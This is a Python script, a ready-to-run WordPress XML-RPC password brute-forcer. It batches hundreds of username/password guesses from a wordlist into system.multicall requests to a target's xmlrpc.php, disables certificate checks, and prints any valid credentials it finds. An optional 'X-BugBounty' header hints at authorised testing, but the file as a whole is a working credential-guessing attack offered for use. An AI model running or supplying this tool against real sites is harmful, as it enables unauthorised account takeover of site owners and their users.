import xml.etree.ElementTree as ET
import time
import requests
import sys
import urllib3
import re
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAIT_TIME = 2
PASSWD_PER_REQUEST = 500
DEBUG_LOGS = True  # Set this flag to True to enable logging


class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def log_to_file(message, filename='brute_logs.txt'):
    with open(filename, 'a', encoding="utf-8") as file:
        file.write(message + '\n')


def clear_log_file(filename='brute_logs.txt'):
    with open(filename, 'w') as file:
        file.truncate()


def send_request(url, data, bb_header, debug_logs):
    headers = {'Content-Type': 'application/xml', 'X-BugBounty': bb_header}
    try:
        response = requests.post(
            f"{url}/xmlrpc.php", data=data, headers=headers, timeout=10, verify=False)
        if debug_logs:
            log_to_file(
                f"Request URL: {url}\nRequest Data: {data}\nResponse: {response.text}")
        return response.text
    except requests.exceptions.RequestException as e:
        error_msg = f"[ERROR] Request failed: {e}"
        if debug_logs:
            log_to_file(error_msg)
        print(bcolors.FAIL + error_msg + bcolors.ENDC)
        return None


def check_response(content):
    if content is None:
        return False
    error_pattern = re.compile(r'<int>(-32700|400|403|405)</int>')
    return error_pattern.search(content) is None


def create_payload(user, passwords):
    method_call = ET.Element('methodCall')
    method_name = ET.SubElement(method_call, 'methodName')
    method_name.text = 'system.multicall'
    params = ET.SubElement(method_call, 'params')
    param = ET.SubElement(params, 'param')
    value = ET.SubElement(param, 'value')
    data_array = ET.SubElement(value, 'array')
    data = ET.SubElement(data_array, 'data')

    for passwd in passwords:
        value_struct = ET.SubElement(data, 'value')
        struct = ET.SubElement(value_struct, 'struct')

        method_name_member = ET.SubElement(struct, 'member')
        method_name_name = ET.SubElement(method_name_member, 'name')
        method_name_name.text = 'methodName'
        method_name_value = ET.SubElement(method_name_member, 'value')
        method_name_value_string = ET.SubElement(method_name_value, 'string')
        method_name_value_string.text = 'wp.getCategories'

        params_member = ET.SubElement(struct, 'member')
        params_name = ET.SubElement(params_member, 'name')
        params_name.text = 'params'
        params_value = ET.SubElement(params_member, 'value')
        params_value_array = ET.SubElement(params_value, 'array')
        params_data = ET.SubElement(params_value_array, 'data')
        params_value_array_inner = ET.SubElement(params_data, 'value')
        params_value_array_inner_data = ET.SubElement(
            params_value_array_inner, 'array')
        inner_data = ET.SubElement(params_value_array_inner_data, 'data')

        user_value = ET.SubElement(inner_data, 'value')
        user_string = ET.SubElement(user_value, 'string')
        user_string.text = user

        passwd_value = ET.SubElement(inner_data, 'value')
        passwd_string = ET.SubElement(passwd_value, 'string')
        passwd_string.text = passwd

    xml_str = ET.tostring(method_call, encoding='unicode')
    return f'<?xml version="1.0"?>{xml_str}'


def brute_force(url, user, passwords, bb_header, total_tested, total_passwords, batch_size, wait_time, debug_logs):
    total = len(passwords)
    tested = 0
    batch = []

    for passwd in passwords:
        batch.append(passwd)
        tested += 1
        total_tested += 1

        if len(batch) == batch_size:
            response = send_request(
                url, create_payload(user, batch), bb_header, debug_logs)
            last_attempt = batch[-1]
            last_attempt_status = "SUCCESS" if check_response(
                response) else "FAILED"
            print(bcolors.OKBLUE +
                  f"[*] Tested {total_tested}/{total_passwords} passwords. Last attempt: {last_attempt} -> {last_attempt_status}" + bcolors.ENDC)

            if response and check_response(response):
                print(
                    bcolors.WARNING + "[!] Possible valid credentials found! Checking individually..." + bcolors.ENDC)
                for p in batch:
                    single_response = send_request(
                        url, create_payload(user, [p]), bb_header, debug_logs)
                    if check_response(single_response):
                        # False positives may occur if response content is unexpected/unhandled
                        print(
                            bcolors.OKGREEN + f"[+] SUCCESS! Valid credentials: {user}/{p}" + bcolors.ENDC)
                        sys.exit(0)

            batch = []
            time.sleep(wait_time)

    if batch:
        response = send_request(url, create_payload(
            user, batch), bb_header, debug_logs)
        last_attempt = batch[-1]
        last_attempt_status = "SUCCESS" if check_response(
            response) else "FAILED"
        print(bcolors.OKBLUE +
              f"[*] Final batch tested. Last attempt: {last_attempt} -> {last_attempt_status}" + bcolors.ENDC)

        if response and check_response(response):
            print(bcolors.WARNING +
                  "[!] Possible valid credentials found! Checking individually..." + bcolors.ENDC)
            for p in batch:
                single_response = send_request(
                    url, create_payload(user, [p]), bb_header, debug_logs)
                if check_response(single_response):
                    print(
                        bcolors.OKGREEN + f"[+] SUCCESS! Valid credentials: {user}/{p}" + bcolors.ENDC)
                    sys.exit(0)

    return total_tested


def read_passwords_in_chunks(file, chunk_size=2000):
    with open(file, 'r', encoding='latin-1') as f:
        chunk = []
        for line in f:
            chunk.append(line.strip())
            if len(chunk) == chunk_size:
                yield chunk
                chunk = []
        if chunk:
            yield chunk


def count_total_passwords(file):
    with open(file, 'r', encoding='latin-1') as f:
        return sum(1 for _ in f)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='WordPress XML-RPC Password Brute Force')
    parser.add_argument('url', help='Target WordPress URL')
    parser.add_argument('password_file', help='Password wordlist file')
    parser.add_argument('usernames', nargs='+', help='Usernames to test')
    parser.add_argument(
        '--header', help='Custom HTTP header (format: "Key: Value")')
    parser.add_argument('--wait-time', type=float, default=WAIT_TIME,
                        help=f'Wait time between requests in seconds (default: {WAIT_TIME})')
    parser.add_argument('--batch-size', type=int, default=PASSWD_PER_REQUEST,
                        help=f'Passwords per batch (default: {PASSWD_PER_REQUEST})')
    parser.add_argument('--debug', action='store_true', default=DEBUG_LOGS,
                        help=f'Enable debug logging (default: {DEBUG_LOGS})')

    args = parser.parse_args()

    start_time = time.time()

    # Parse the header argument
    bb_header = ""
    if args.header:
        if args.header.startswith("X-BugBounty:"):
            bb_header = args.header[12:].strip()
        else:
            bb_header = args.header

    if args.debug:
        clear_log_file()

    total_tested = 0
    total_passwords = count_total_passwords(args.password_file)

    for username in args.usernames:
        print(bcolors.OKBLUE + f"[*] Testing user: {username}" + bcolors.ENDC)
        for passwords_chunk in read_passwords_in_chunks(args.password_file):
            total_tested = brute_force(
                args.url, username, passwords_chunk, bb_header, total_tested, total_passwords, args.batch_size, args.wait_time, args.debug)

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(bcolors.OKBLUE +
          f"\n[*] Total execution time: {elapsed_time:.2f} seconds" + bcolors.ENDC)
    print(bcolors.OKBLUE +
          f"[*] Total passwords tested: {total_tested}/{total_passwords}" + bcolors.ENDC)
